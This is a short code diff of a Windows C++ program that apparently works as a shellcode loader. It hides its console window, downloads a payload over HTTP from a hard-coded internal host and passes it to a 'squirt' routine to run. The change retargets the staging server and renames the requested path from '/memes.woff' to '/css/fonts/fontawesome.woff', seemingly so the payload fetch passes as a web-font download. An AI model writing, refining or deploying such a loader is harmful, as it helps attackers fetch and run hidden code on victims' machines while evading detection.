@@ -22,7 +22,7 @@ int main() {
     ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // hide console window , SW_HIDE);
 
     struct sc scc;
-    if (!Download(L"10.10.10.2", 8080, &scc)) { return 2; }
+    if (!Download(L"10.8.0.111", 80, &scc)) { return 2; }
 
     if (!squirt(scc)) { return 3; }
 
@@ -52,7 +52,7 @@ BOOL Download(LPCWSTR host, INTERNET_PORT port, sc* scc) {
     HINTERNET request = HttpOpenRequest(
         connection,
         L"GET",
-        L"/memes.woff",
+        L"/css/fonts/fontawesome.woff",
         NULL,
         NULL,
         NULL,
